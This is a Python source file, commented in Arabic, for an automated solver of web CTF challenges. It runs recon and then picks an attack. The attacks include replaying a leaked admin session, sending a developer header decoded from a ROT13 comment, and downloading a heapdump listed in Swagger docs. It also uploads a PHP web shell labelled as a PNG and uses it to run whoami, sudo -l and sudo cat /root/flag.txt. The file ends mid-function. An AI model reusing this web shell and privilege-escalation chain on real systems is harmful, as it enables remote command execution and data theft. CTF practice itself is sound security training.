# -*- coding: utf-8 -*-
"""
CTF Falcon - Web Session Audit  (v2.3.0)
==============================================================================
موزِّع محلِّلات لتحديات الويب التعليمية المصرّح بها. يفحص الصفحة أولًا (recon)،
ثم يختار المحلل المناسب حسب الأدلة الفعلية فقط:

  - Old Sessions     : يعتمد على تحويل / → /login + كوكي جلسة، ثم /register
                       و/sessions — وكل خطوة مشروطة بدليل من الاستجابة السابقة.
  - Crack the Gate   : تعليق ROT13 يكشف ترويسة مطوّر + مسار دخول JSON بالبريد.
  - SSTI1            : نموذج POST فعلي؛ يثبت التقييم باختبار حسابي ثم يقرأ علم CTF.
  - n0s4n1ty 1       : نموذج رفع فعلي؛ يرفع web shell تعليميًا، ويتحقق من sudo قبل قراءة العلم.
  - غير معروف        : يعرض المكتشفات الفعلية دون تنفيذ أي مسار تلقائيًا.

مبادئ ثابتة:
  - لا تثبيت لمضيف/منفذ/علم. كل شيء من رابط الطالب.
  - قفل الأصل: كل الطلبات على أصل التحدي نفسه؛ التحويل لمضيف آخر يُرفض.
  - لا اتباع تلقائي للتحويلات: كل استجابة تُسجّل على حدة.
  - تصحيح الكوكيز محفوظ: Max-Age <= 0 = طلب حذف.
  - لا تخمين كلمات مرور ولا مسح مسارات. الأدلة المتاحة فقط؛ SSTI يتطلب نموذج POST مكتشفًا.
  - لا ادعاء نجاح أو علمًا عند الفشل؛ ولا عرض لكلمات المرور أو قيم الجلسات.

نقطة الدخول العامة: run_audit(url, **options) -> dict  (يستدعيها falcon_local.py)
==============================================================================
"""
from __future__ import annotations

import json
import ast
import re
import ssl
import sys
import http.client
import secrets
import codecs
import html as html_lib
from datetime import datetime, timezone
from email.utils import parsedate_to_datetime
from urllib.parse import urlsplit, urlencode, urljoin, quote

__version__ = "2.19.0"

# --------------------------------------------------------------------------- #
DEFAULT_FLAG_PATTERNS = [
    r"academy\{[^}]+\}",          # صيغة منصة Cylab Academy
    r"picoCTF\{[^}]+\}",
    r"flag\{[^}]+\}",
    r"FLAG\{[^}]+\}",
    r"CTF\{[^}]+\}",
]
DEFAULT_TIMEOUT = 15
MAX_BODY = 2 * 1024 * 1024
MAX_HEAPDUMP_BODY = 32 * 1024 * 1024
TEST_PASSWORD = "falcon-nonsensitive-test"   # كلمة مرور تجريبية، لا تُسجَّل أبدًا
USER_AGENT = f"CTF-Falcon-WebAudit/{__version__} (educational; authorized-CTF-only)"


# --------------------------------------------------------------------------- #
#  عميل HTTP: لا يتبع التحويلات، يقفل الأصل، يحفظ الكوكيز يدويًا                 #
# --------------------------------------------------------------------------- #
class HttpClient:
    def __init__(self, timeout=DEFAULT_TIMEOUT, insecure_tls=False):
        self.timeout = timeout
        self.insecure_tls = insecure_tls
        self.cookies: dict[str, str] = {}
        self.origin = None

    def cookie_header(self) -> str:
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def apply_set_cookies(self, analyzed_cookies: list[dict]) -> list[str]:
        notes = []
        for c in analyzed_cookies:
            name = c["name"]
            if c["intent"] == "deletion":
                if name in self.cookies:
                    del self.cookies[name]
                    notes.append(f"حُذفت الكوكي «{name}» بناءً على طلب الخادم (Max-Age<=0 أو Expires ماضٍ).")
                else:
                    notes.append(f"طلب الخادم حذف كوكي «{name}» غير موجودة لدينا.")
            else:
                self.cookies[name] = c["value"]
                notes.append(f"خُزّنت/حُدّثت الكوكي «{name}».")
        return notes

    def request(self, method: str, url: str, body: str | bytes | None = None,
                extra_headers: dict | None = None, max_body: int = MAX_BODY) -> dict:
        parts = urlsplit(url)
        scheme = parts.scheme or "http"
        host = parts.hostname
        port = parts.port or (443 if scheme == "https" else 80)
        path = parts.path or "/"
        if parts.query:
            path += "?" + parts.query

        # قفل الأصل: لا مصادقة مضمّنة، ولا انتقال لمضيف مختلف
        origin = (scheme, host, port)
        if parts.username or parts.password or scheme not in ("http", "https"):
            raise ValueError("Invalid challenge URL")
        if self.origin is not None and self.origin != origin:
            raise ValueError("Cross-origin challenge request blocked")
        self.origin = origin

        if scheme == "https":
            ctx = ssl.create_default_context()
            if self.insecure_tls:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=self.timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=self.timeout)

        headers = {
            "User-Agent": USER_AGENT,
            "Accept": "text/html,application/xhtml+xml,application/json,*/*",
            "Connection": "close",
        }
        if self.cookies:
            headers["Cookie"] = self.cookie_header()
        if body is not None:
            if isinstance(body, bytes):
                headers["Content-Type"] = "application/octet-stream"
                headers["Content-Length"] = str(len(body))
            else:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                headers["Content-Length"] = str(len(body.encode("utf-8")))
        if extra_headers:
            headers.update(extra_headers)   # يسمح بتجاوز Content-Type لـ JSON

        try:
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            raw_headers = resp.getheaders()
            raw_body = resp.read(max_body + 1)
            if len(raw_body) > max_body:
                raise ValueError(f"Response exceeds {max_body} bytes")
            status = resp.status
            reason = resp.reason
        finally:
            conn.close()

        text = raw_body.decode("utf-8", errors="replace")
        set_cookie_raw = [v for (k, v) in raw_headers if k.lower() == "set-cookie"]
        location = next((v for (k, v) in raw_headers if k.lower() == "location"), None)
        ctype = next((v for (k, v) in raw_headers if k.lower() == "content-type"), "")

        return {
            "method": method, "url": url, "request_cookies": dict(self.cookies),
            "status": status, "reason": reason, "location": location,
            "content_type": ctype, "set_cookie_raw": set_cookie_raw,
            "headers": raw_headers, "body": text,
        }


# --------------------------------------------------------------------------- #
#  تحليل الكوكيز (تصحيح Max-Age محفوظ)                                          #
# --------------------------------------------------------------------------- #
def _parse_cookie_attrs(raw: str):
    segments = [s.strip() for s in raw.split(";") if s.strip() != ""]
    if not segments:
        return "", "", {}
    first = segments[0]
    if "=" in first:
        name, value = first.split("=", 1)
    else:
        name, value = first, ""
    attrs = {}
    for seg in segments[1:]:
        if "=" in seg:
            k, v = seg.split("=", 1)
            attrs[k.strip().lower()] = v.strip()
        else:
            attrs[seg.strip().lower()] = True
    return name.strip(), value.strip(), attrs


def analyze_set_cookie(raw: str) -> dict:
    name, value, attrs = _parse_cookie_attrs(raw)
    notes: list[str] = []
    intent = "set"
    lifetime_seconds = None
    expires_dt = None
    now = datetime.now(timezone.utc)

    if "max-age" in attrs and attrs["max-age"] is not True:
        try:
            ma = int(str(attrs["max-age"]).strip())
            lifetime_seconds = ma
            if ma <= 0:
                intent = "deletion"
                notes.append("Max-Age <= 0: هذا طلب حذف للكوكي (وليست دائمة).")
            else:
                notes.append(f"Max-Age = {ma} ثانية: عمر محدد للكوكي في المتصفح.")
        except ValueError:
            notes.append("قيمة Max-Age غير صالحة؛ تم تجاهلها.")

    if "expires" in attrs and attrs["expires"] is not True:
        try:
            expires_dt = parsedate_to_datetime(str(attrs["expires"]))
            if expires_dt.tzinfo is None:
                expires_dt = expires_dt.replace(tzinfo=timezone.utc)
            if intent != "deletion" and lifetime_seconds is None:
                if expires_dt <= now:
                    intent = "deletion"
                    notes.append("Expires في الماضي: الكوكي منتهية/محذوفة.")
                else:
                    years = (expires_dt - now).days / 365.25
                    notes.append(f"Expires في المستقبل (~{years:.1f} سنة): كوكي دائمة على المتصفح.")
                    notes.append("تنبيه: تاريخ الانتهاء البعيد وحده لا يثبت أن جلسة المصادقة "
                                 "لا تنتهي على الخادم؛ يجب التحقق من سلوك الخادم.")
        except (TypeError, ValueError):
            notes.append("تعذّر تحليل قيمة Expires؛ تم تجاهلها.")

    if intent == "set" and lifetime_seconds is None and expires_dt is None:
        notes.append("لا Max-Age ولا Expires: كوكي جلسة تُحذف بإغلاق المتصفح.")
    if intent == "deletion" and value == "":
        notes.append("القيمة فارغة مع نية الحذف: إزالة واضحة للكوكي.")

    hardening = []
    if "httponly" not in attrs:
        hardening.append("HttpOnly غائبة: الكوكي مقروءة بـ JavaScript (ملاحظة منفصلة).")
    if "secure" not in attrs:
        hardening.append("Secure غائبة: قد تُرسل عبر HTTP غير المشفّر (ملاحظة منفصلة).")
    if "samesite" not in attrs:
        hardening.append("SameSite غير محددة: اعتبارات CSRF (ملاحظة منفصلة).")
    if hardening:
        hardening.append("أيٌّ من هذه وحده لا يثبت إمكانية استخراج العلم.")

    return {
        "raw": raw, "name": name, "value": value, "attrs": attrs,
        "intent": intent, "lifetime_seconds": lifetime_seconds,
        "expires": expires_dt.isoformat() if expires_dt else None,
        "httponly": "httponly" in attrs, "secure": "secure" in attrs,
        "samesite": attrs.get("samesite") if "samesite" in attrs else None,
        "notes_ar": notes, "hardening_ar": hardening,
    }


def analyze_response_cookies(resp: dict) -> list[dict]:
    return [analyze_set_cookie(raw) for raw in resp.get("set_cookie_raw", [])]


# --------------------------------------------------------------------------- #
#  أدوات فحص الصفحة (recon)                                                     #
# --------------------------------------------------------------------------- #
def rot13(s: str) -> str:
    return codecs.encode(s, "rot_13")


_COMMENT_RE = re.compile(r"<!--(.*?)-->", re.S)
_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
_FETCH_RE = re.compile(r"""fetch\s*\(\s*['"]([^'"]+)['"]""", re.I)
_INPUT_NAME_RE = re.compile(r'<input[^>]*\bname\s*=\s*["\']([^"\']+)["\']', re.I)
_TEXTAREA_NAME_RE = re.compile(r'<textarea[^>]*\bname\s*=\s*["\']([^"\']+)["\']', re.I)
_FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
_ACTION_RE = re.compile(r'\baction\s*=\s*["\']([^"\']*)["\']', re.I)
_FMETHOD_RE = re.compile(r'\bmethod\s*=\s*["\']([^"\']*)["\']', re.I)

# ترويسة مطوّر داخل نص التعليق، مثل:  header "X-Dev-Access: yes"  أو  X-Foo: bar
_HEADER_HINT_RES = [
    re.compile(r'header[^"\']*["\']\s*([A-Za-z][A-Za-z0-9\-]*)\s*:\s*([^"\'\s]+)', re.I),
    re.compile(r'\b(X-[A-Za-z0-9\-]+)\s*:\s*([A-Za-z0-9_\-]+)', re.I),
]


def extract_comments(html: str) -> list[str]:
    return [m.group(1).strip() for m in _COMMENT_RE.finditer(html)]


def extract_emails(text: str) -> list[str]:
    seen, out = set(), []
    for m in _EMAIL_RE.finditer(text):
        e = m.group(0)
        if e not in seen:
            seen.add(e); out.append(e)
    return out


def find_form_fields(html: str) -> list[str]:
    return _INPUT_NAME_RE.findall(html)


def find_forms(html: str) -> list[dict]:
    forms = []
    for m in _FORM_RE.finditer(html):
        attrs, inner = m.group(1), m.group(2)
        action = (_ACTION_RE.search(attrs).group(1) if _ACTION_RE.search(attrs) else "")
        method = (_FMETHOD_RE.search(attrs).group(1).upper() if _FMETHOD_RE.search(attrs) else "GET")
        file_inputs = re.findall(r'<input\b(?=[^>]*\btype\s*=\s*["\']?file\b)[^>]*>', inner, re.I)
        file_fields = [m.group(1) for tag in file_inputs
                       for m in [re.search(r'\bname\s*=\s*["\']([^"\']+)', tag, re.I)] if m]
        enctype_m = re.search(r'\benctype\s*=\s*["\']([^"\']+)', attrs, re.I)
        forms.append({"action": action, "method": method,
                      "enctype": enctype_m.group(1).lower() if enctype_m else "",
                      "fields": _INPUT_NAME_RE.findall(inner) + _TEXTAREA_NAME_RE.findall(inner),
                      "file_fields": file_fields})
    return forms


def extract_login_fetch(html: str) -> dict | None:
    """
    يحلّل استدعاءات fetch في السكربتات الداخلية ويعيد أول مسار دخول
    يرسل JSON يحتوي email/password (أو ما يشبهه).
    """
    for m in _FETCH_RE.finditer(html):
        path = m.group(1)
        # Bound options to this fetch call, respecting strings and nested objects.
        start = html.find("(", m.start())
        depth, quote, escaped, end = 0, None, False, len(html)
        for i in range(start, len(html)):
            ch = html[i]
            if quote:
                if escaped:
                    escaped = False
                elif ch == "\\":
                    escaped = True
                elif ch == quote:
                    quote = None
                continue
            if ch in ("'", '"', "`"):
                quote = ch
            elif ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth == 0:
                    end = i
                    break
        window = html[m.end():end]
        low = window.lower()
        field_text = low
        # JSON.stringify(data) may refer to fields declared before fetch.
        variable = re.search(r"json\.stringify\(\s*([a-z_$][\w$]*)\s*\)", low)
        if variable:
            script_start = html.lower().rfind("<script", 0, m.start())
            prefix = html[script_start if script_start >= 0 else m.start():m.start()]
            declaration = re.search(r"\b(?:const|let|var)\s+" + re.escape(variable.group(1)) + r"\s*=\s*\{([^{}]*)\}", prefix, re.I | re.S)
            if declaration:
                field_text += " {" + declaration.group(1).lower() + "}"

        is_json = "application/json" in low or "json.stringify" in low
        if re.search(r"method\s*:\s*['\"]post['\"]", low):
            method = "POST"
        elif "json.stringify" in low:
            method = "POST"
        else:
            method = "GET"
        fields = []
        for f in ("email", "password", "username", "user", "pass"):
            if re.search(r"['\"]?" + f + r"['\"]?\s*:", field_text) or re.search(r"(?:\{|,)\s*" + f + r"\s*(?=,|\})", field_text):
                fields.append(f)
        reads = [k for k in ("success", "flag", "token", "error")
                 if re.search(r"\.\s*" + k + r"\b", low) or ("'" + k + "'" in low) or ('"' + k + '"' in low)]
        if ("email" in fields or "username" in fields) and ("password" in fields or "pass" in fields):
            return {"path": path, "method": method or "POST", "json": is_json, "fields": fields, "reads": reads}
    return None


def find_sessions_hint(html: str) -> str | None:
    m = re.search(r'strange page at\s+(/[\w\-/\.]*)', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'\bat\s+(/sessions\b[\w\-/\.]*)', html, re.I)
    if m:
        return m.group(1)
    if "/sessions" in html:
        return "/sessions"
    return None


_SESSION_LINE_RE = re.compile(r'session\s*:\s*([^\s,<]+)\s*,\s*(\{.*?\}|.+?)(?:</p>|<br|\n|$)', re.I | re.S)


def parse_sessions_dump(html: str) -> list[dict]:
    entries = []
    for m in _SESSION_LINE_RE.finditer(html):
        entries.append({"token": m.group(1).strip().strip(","), "decoded": m.group(2).strip()})
    return entries


_ADMIN_HINTS = [
    (re.compile(r"['\"]admin['\"]\s*:\s*true", re.I), 5),
    (re.compile(r"\badmin\s*=\s*true", re.I), 5),
    (re.compile(r"['\"](?:username|user|name)['\"]\s*:\s*['\"]admin['\"]", re.I), 4),
    (re.compile(r"['\"]role['\"]\s*:\s*['\"]admin['\"]", re.I), 4),
    (re.compile(r"['\"]is_admin['\"]\s*:\s*true", re.I), 5),
    (re.compile(r"\badmin\b", re.I), 1),
]


def pick_admin_entry(entries: list[dict], own_token: str | None) -> dict | None:
    best, best_score = None, 0
    for e in entries:
        if own_token and e["token"] == own_token:
            continue
        score = sum(w for rx, w in _ADMIN_HINTS if rx.search(e["decoded"]))
        if score > best_score:
            best, best_score = e, score
    if best is None:
        for e in entries:
            if not own_token or e["token"] != own_token:
                return e
    return best


def extract_flag(bodies: list[tuple[str, str]], patterns: list[str]) -> tuple[str | None, str | None]:
    compiled = [re.compile(p) for p in patterns]
    for label, body in bodies:
        for rx in compiled:
            mm = rx.search(body)
            if mm:
                return mm.group(0), label
    return None, None


def _mask(value: str | None, keep: int = 4) -> str | None:
    if not value:
        return value
    return value[:keep] + "…" if len(value) > keep else "…"


# --------------------------------------------------------------------------- #
#  المُسجِّل: يسجّل كل استجابة مع تحليل الكوكيز، ويُخفي قيم الجلسات في السجل      #
# --------------------------------------------------------------------------- #
def _make_recorder(client, steps, bodies_for_flag):
    def record(resp, note_lines):
        analyzed = analyze_response_cookies(resp)
        jar_notes = client.apply_set_cookies(analyzed)
        masked_req = {k: _mask(v) for k, v in resp["request_cookies"].items()}  # لا قيم كاملة في السجل
        step = {
            "n": len(steps) + 1,
            "method": resp["method"], "url": resp["url"],
            "request_cookies": masked_req,
            "status": resp["status"], "reason": resp["reason"], "location": resp["location"],
            "set_cookies": analyzed, "body_snippet": resp["body"][:600],
            "notes_ar": note_lines + jar_notes,
        }
        steps.append(step)
        bodies_for_flag.append((f"step{step['n']}:{resp['method']} {urlsplit(resp['url']).path}", resp["body"]))
        return step
    return record


def _base_result(origin, challenge, analyzer, recognized):
    return {
        "tool": "CTF Falcon - Web Session Audit", "version": __version__,
        "challenge": challenge, "analyzer": analyzer, "recognized": recognized,
        "target": origin, "started_at": datetime.now(timezone.utc).isoformat(),
        "success": False, "flag": None, "flag_source": None,
        "steps": [], "explanation_ar": [], "warnings": [], "discovered": {},
        "note": "أداة تعليمية لتحديات CTF المصرّح بها فقط؛ لا تُرسل العلم تلقائيًا.",
    }


# --------------------------------------------------------------------------- #
#  الفحص الأولي (recon)                                                         #
# --------------------------------------------------------------------------- #
def do_recon(client, origin, record) -> dict:
    r = client.request("GET", origin)
    record(r, ["فحص الصفحة: قراءة التعليقات والنماذج وطلبات fetch."])
    html = r["body"]
    decoded = [{"raw": c, "rot13": rot13(c)} for c in extract_comments(html)]
    return {
        "resp": r, "html": html,
        "decoded_comments": decoded,
        "emails": extract_emails(html),
        "forms": find_forms(html),
        "login_fetch": extract_login_fetch(html),
    }


# --------------------------------------------------------------------------- #
#  كشف الأنماط                                                                   #
# --------------------------------------------------------------------------- #
def _find_dev_header(decoded_comments):
    """يبحث عن ترويسة مطوّر داخل التعليقات (بعد ROT13 أو خامًا)."""
    for c in decoded_comments:
        for text_kind in ("rot13", "raw"):
            text = c[text_kind]
            for rx in _HEADER_HINT_RES:
                m = rx.search(text)
                if m:
                    name, val = m.group(1), m.group(2)
                    return ({"name": name, "value": val},
                            c["raw"],
                            c["rot13"] if text_kind == "rot13" else c["raw"])
    return None, None, None


def detect_crack_the_gate(recon):
    dev_header, comment_raw, comment_decoded = _find_dev_header(recon["decoded_comments"])
    if not dev_header:
        return None
    lf = recon["login_fetch"]
    login_path, method, is_json, fields = None, "POST", True, []
    if lf:
        login_path, method, is_json, fields = lf["path"], lf["method"], lf["json"], lf["fields"]
    else:
        for f in recon["forms"]:
            if "email" in f["fields"] and f["action"]:
                login_path, method, is_json, fields = f["action"], f["method"], False, f["fields"]
                break
    if not login_path:
        return None
    return {
        "dev_header": dev_header, "comment_raw": comment_raw, "comment_decoded": comment_decoded,
        "login_path": login_path, "method": method, "json": is_json, "fields": fields,
    }



def detect_ssti1(recon):
    """Recognize a server template challenge only when a real POST form has fields."""
    for form in recon.get("forms", []):
        fields = form.get("fields") or []
        field = next((f for f in fields if f.lower() in {"content", "announcement", "message"}), None)
        if form.get("method") == "POST" and field and re.search(r"\b(announce|announcement|what do you want)\b", recon.get("html", ""), re.I):
            return {"action": form.get("action") or "/", "field": field,
                    "fields": fields, "method": "POST"}
    return None


def detect_n0s4n1ty(recon):
    """Recognize the file upload challenge only from an actual multipart file form."""
    for form in recon.get("forms", []):
        files = form.get("file_fields") or []
        if form.get("method") == "POST" and files and (
                "multipart/form-data" in form.get("enctype", "") or
                re.search(r"profile|picture|upload|file", recon.get("html", ""), re.I)):
            return {"action": form.get("action") or "/", "field": files[0],
                    "file_fields": files, "method": "POST"}
    return None


_ANCHOR_RE = re.compile(r"<a\b([^>]*)>(.*?)</a\s*>", re.I | re.S)
_HREF_RE = re.compile(r"\bhref\s*=\s*['\"]([^'\"]+)['\"]", re.I)
_SCRIPT_SRC_RE = re.compile(r"<script\b[^>]*\bsrc\s*=\s*['\"]([^'\"]+)['\"][^>]*>", re.I)


def detect_head_dump(recon):
    """Only enter this analyzer when the homepage links to its API documentation."""
    page = recon.get("html", "")
    for attrs, inner in _ANCHOR_RE.findall(page):
        href = _HREF_RE.search(attrs)
        label = re.sub(r"<[^>]*>", " ", inner)
        label = html_lib.unescape(re.sub(r"\s+", " ", label)).strip()
        if href and "api documentation" in label.lower() and "api-docs" in href.group(1).lower():
            return {"documentation_link": html_lib.unescape(href.group(1)), "label": label}
    return None


def _get_with_observed_redirects(client, url, record, note, max_redirects=3,
                                max_body=MAX_BODY):
    """GET a discovered URL and explicitly record bounded, same-origin redirects."""
    current = url
    for index in range(max_redirects + 1):
        response = client.request("GET", current, max_body=max_body)
        record(response, [note if index == 0 else "اتباع تحويل GET معلَن داخل أصل التحدي."])
        if response["status"] not in (301, 302, 303, 307, 308) or not response.get("location"):
            return response
        next_url = urljoin(current, response["location"])
        old, new = urlsplit(current), urlsplit(next_url)
        if (old.scheme, old.netloc) != (new.scheme, new.netloc):
            raise ValueError("Cross-origin redirect blocked")
        current = next_url
    raise ValueError("Too many same-origin redirects")


def solve_head_dump(client, origin, recon, ev, steps, record,
                    flag_patterns) -> dict:
    res = _base_result(origin, "head-dump", "head-dump", recognized=True)
    res["steps"] = steps
    res["discovered"] = {"documentation_link": ev["documentation_link"]}
    res["explanation_ar"].append(
        "تتبع صقر رابط «API Documentation» الموجود في الصفحة؛ لن يجرّب مسارات غير موثقة.")
    docs_url = urljoin(origin, ev["documentation_link"])
    try:
        docs = _get_with_observed_redirects(
            client, docs_url, record, "فتح رابط توثيق API المكتشف في الصفحة الرئيسية.")
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر فتح رابط توثيق API: {e}.")
        return res
    if not 200 <= docs["status"] < 300:
        res["warnings"].append(f"أعاد رابط توثيق API الحالة HTTP {docs['status']}.")
        return res

    script_src = next((src for src in _SCRIPT_SRC_RE.findall(docs["body"])
                       if "swagger-ui-init" in src.lower()), None)
    if script_src:
        spec_url = urljoin(docs["url"], html_lib.unescape(script_src))
        try:
            spec = _get_with_observed_redirects(
                client, spec_url, record, "قراءة ملف إعداد Swagger المرتبط بصفحة التوثيق.")
        except (OSError, http.client.HTTPException, ValueError) as e:
            res["warnings"].append(f"تعذّر قراءة ملف إعداد Swagger: {e}.")
            return res
        if not 200 <= spec["status"] < 300:
            res["warnings"].append(f"أعاد ملف إعداد Swagger الحالة HTTP {spec['status']}.")
            return res
        spec_text, spec_source = spec["body"], spec_url
    else:
        # Some Swagger installations embed their API document directly in the HTML.
        spec_text, spec_source = docs["body"], docs_url

    route_match = re.search(r"['\"](/heapdump)['\"]\s*:\s*\{", spec_text, re.I)
    if not route_match:
        res["explanation_ar"].append("لم يعرض التوثيق المفتوح مسار heapdump صراحةً؛ لم يُطلب أي مسار آخر.")
        res["warnings"].append("تعذّر إثبات مسار تفريغ الذاكرة من مستندات API المكتشفة.")
        return res
    heap_path = route_match.group(1)
    heap_url = urljoin(spec_source, heap_path)
    res["discovered"]["swagger_source"] = spec_url if script_src else None
    res["discovered"]["heapdump_path"] = heap_path
    res["explanation_ar"].append(
        f"توثيق Swagger يعرّف GET {heap_path}؛ سيُقرأ الملف بهذا المسار الموثّق فقط.")
    try:
        dump = _get_with_observed_redirects(
            client, heap_url, record,
            "تنزيل heap snapshot من endpoint الموثق في Swagger (حد الاستجابة 32 MiB).",
            max_body=MAX_HEAPDUMP_BODY)
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر تنزيل ملف heap snapshot: {e}.")
        return res
    res["discovered"]["heapdump_status"] = dump["status"]
    res["discovered"]["heapdump_bytes"] = len(dump["body"].encode("utf-8", errors="replace"))
    disposition = next((v for k, v in dump["headers"] if k.lower() == "content-disposition"), "")
    filename = re.search(r"filename\s*=\s*[\"']?([^\"';]+)", disposition, re.I)
    if filename:
        res["discovered"]["artifact_filename"] = filename.group(1)
    if not 200 <= dump["status"] < 300:
        res["warnings"].append(f"أعاد heapdump الحالة HTTP {dump['status']}.")
        return res
    flag, source = extract_flag([(f"step{len(steps)}:heapdump", dump["body"])], flag_patterns)
    if flag:
        res["success"], res["flag"], res["flag_source"] = True, flag, source
        res["explanation_ar"].append(
            "عُثر على العلم داخل استجابة heap snapshot الفعلية؛ يوضح هذا التحدي خطر كشف بيانات الذاكرة.")
    else:
        res["warnings"].append(
            "تم تنزيل heap snapshot بنجاح لكن لم يظهر نمط علم معروف؛ راجع حجم الملف أو صيغة العلم.")
    return res


def _multipart_file(boundary: str, field: str, filename: str,
                    content_type: str, content: bytes) -> bytes:
    """Build one RFC 7578 file part; challenge payload is fixed and noninteractive."""
    head = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n").encode("utf-8")
    return head + content + f"\r\n--{boundary}--\r\n".encode("ascii")


_UPLOAD_PATH_RE = re.compile(r"(?:href=[\"']?)([^\"'<> ]*uploads/[^\"'<> ]+\.php)|((?:[\w./-]*uploads/)[\w.-]+\.php)", re.I)


def _uploaded_shell_path(body: str, filename: str) -> str | None:
    for m in _UPLOAD_PATH_RE.finditer(body):
        candidate = next((g for g in m.groups() if g), None)
        if candidate:
            return candidate
    if re.search(r"uploaded|success", body, re.I) and filename in body:
        return "uploads/" + filename
    return None


def solve_n0s4n1ty(client, origin, recon, ev, steps, record,
                   flag_patterns) -> dict:
    res = _base_result(origin, "n0s4n1ty 1", "n0s4n1ty-1", recognized=True)
    res["steps"] = steps
    res["discovered"] = {"form_action": ev["action"], "file_field": ev["field"],
                         "file_fields": ev["file_fields"]}
    res["explanation_ar"].append(
        f"اكتُشف نموذج رفع POST بحقل الملف «{ev['field']}». سيُرفع ملف PHP محدود لتنفيذ أوامر هذا التحدي فقط.")
    endpoint = urljoin(origin, ev["action"])
    filename = "falcon_cmd.php"
    boundary = "----FalconCTF" + secrets.token_hex(12)
    payload = b"<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"
    body = _multipart_file(boundary, ev["field"], filename, "image/png", payload)
    try:
        upload = client.request("POST", endpoint, body=body,
                                extra_headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        record(upload, ["رفع ملف PHP باسم falcon_cmd.php إلى حقل الملف المكتشف؛ لم تُرسل أوامر قبل تأكيد مسار الرفع."])
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر إرسال الملف إلى نموذج الرفع: {e}.")
        return res
    res["discovered"]["upload_status"] = upload["status"]
    security_page = bool(re.search(
        r"Kaspersky Endpoint Security|Request has been forbidden by antivirus|forbidden by antivirus",
        upload["body"], re.I))
    if security_page:
        res["discovered"]["upload_blocked_by_security"] = "Kaspersky Endpoint Security"
        res["explanation_ar"].append(
            "الاستجابة صفحة حظر من Kaspersky، وليست ردّ تطبيق التحدي؛ لم يصل تأكيد الرفع إلى الموقع.")
        res["warnings"].append(
            "اعترض Kaspersky الطلب محليًا (HTTP 499). هذا لا يثبت أن الموقع رفض الملف. أوقف صقر المحاولة؛ استخدم بيئة التحدي المعتمدة أو اطلب من مسؤول الشبكة مراجعة السماح بالاتصال بنطاق التحدي. لا تغيّر الحمولة لتجاوز الحماية.")
        return res
    upload_path = _uploaded_shell_path(upload["body"], filename)
    res["discovered"]["upload_path"] = upload_path
    if not (200 <= upload["status"] < 300) or not upload_path:
        snippet = re.sub(r"\s+", " ", upload["body"][:240]).strip()
        res["explanation_ar"].append("لم يؤكد رد الخادم نجاح الرفع أو يعرض مسار الملف؛ أُوقف التنفيذ هنا.")
        res["warnings"].append(f"رد الرفع HTTP {upload['status']}: {snippet or '[استجابة فارغة]'}. تحقق من نوع الملف وحقل الرفع ثم أعد المحاولة.")
        return res
    shell_url = urljoin(origin, upload_path)
    shell_parts, origin_parts = urlsplit(shell_url), urlsplit(origin)
    if (shell_parts.scheme, shell_parts.netloc) != (origin_parts.scheme, origin_parts.netloc):
        res["warnings"].append("رفض صقر مسار الملف لأنه خرج عن أصل التحدي.")
        return res
    res["explanation_ar"].append(f"أكّد الخادم رفع الملف في المسار «{upload_path}»؛ نتحقق الآن من تنفيذ PHP.")

    def run_command(command, note):
        url = shell_url + ("&" if "?" in shell_url else "?") + "cmd=" + quote(command, safe="")
        response = client.request("GET", url)
        record(response, [note])
        return response

    try:
        who = run_command("whoami", "اختبار تنفيذ الأمر whoami عبر الملف المرفوع.")
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر التحقق من الملف المرفوع: {e}.")
        return res
    if not (200 <= who["status"] < 300) or not who["body"].strip():
        res["warnings"].append("لم يُظهر الملف المرفوع ناتج whoami؛ لم تُنفّذ أوامر sudo.")
        return res
    res["discovered"]["web_user"] = re.sub(r"\s+", " ", who["body"]).strip()[:100]
    res["explanation_ar"].append("استجاب ملف PHP لطلب whoami؛ نفحص الآن صلاحيات sudo كما يوصي التحدي.")
    try:
        sudo = run_command("sudo -l", "فحص sudo -l؛ لا تُقرأ ملفات /root إلا إذا أثبت الرد صلاحية NOPASSWD.")
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّر فحص صلاحيات sudo: {e}.")
        return res
    res["discovered"]["sudo_nopasswd"] = bool(re.search(r"NOPASSWD\s*:\s*(?:ALL\b|/)", sudo["body"], re.I))
    if not (200 <= sudo["status"] < 300) or not res["discovered"]["sudo_nopasswd"]:
        res["explanation_ar"].append("لم يثبت رد sudo -l صلاحية NOPASSWD؛ لم يطلب صقر قراءة /root.")
        res["warnings"].append("لم يظهر تصريح sudo بلا كلمة مرور في الاستجابة الفعلية.")
        return res
    try:
        flag_resp = run_command("sudo cat /root/flag.txt", "قراءة /root/flag.txt بعد ثبوت تصريح NOPASSWD في sudo -l.")
    except (OSError, http.client.HTTPException, ValueError) as e:
        res["warnings"].append(f"تعذّرت قراءة ملف العلم: {e}.")
        return res
    flag, source = extract_flag([(f"step{len(steps)}:response", flag_resp["body"])], flag_patterns)
    if flag and 200 <= flag_resp["status"] < 300:
        res["success"], res["flag"] = True, flag
        res["flag_source"] = source
        res["explanation_ar"].append("استُخرج العلم من استجابة الخادم الفعلية.")
    else:
        res["warnings"].append("لم يظهر علم مطابق في استجابة قراءة الملف.")
    return res



def _request_ssti_form(client, method, url, body, record, note):
    """Issue a form request and honor one same-origin 307/308 redirect."""
    response = client.request(method, url, body=body)
    record(response, [note])
    if response["status"] in (307, 308) and response.get("location"):
        redirected = urljoin(url, response["location"])
